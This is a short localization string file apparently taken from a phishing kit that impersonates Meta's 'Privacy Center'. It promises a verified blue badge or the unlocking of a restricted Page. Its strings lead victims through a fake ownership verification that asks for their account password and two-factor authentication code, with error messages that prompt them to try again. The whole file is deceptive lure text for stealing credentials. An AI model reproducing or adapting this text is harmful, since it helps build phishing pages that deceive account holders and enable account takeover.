privacyCenter.title: Privacy Center
privacyCenter.congratulationsMessage: Congratulations! There is only one final step left for your page to receive the verified blue badge from Meta. Please fill out the form below to complete the ownership verification.

step1.note: Note: Our reply will be sent to you within 14 to 48 hours.
step1.agreeTerms: I agree to the Terms of Use

validation.agreeTermsRequired: Please agree to the Terms of Use

step2.error: The password that you've entered is incorrect.

step3.title: Two-Factor Authentication required
step3.description: Enter the code for this account that we sent to {email}, {phone}, or simply confirm via your configured Two-Factor App (e.g. Duo Mobile or Google Authenticator).
step3.error: The code that you've entered is incorrect.

livePage.description: Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
livePage.protection: We've enabled advanced protections to unlock your Page.
livePage.process: Below, we walk you through the process in detail and help you fully activate to unlock your Page.
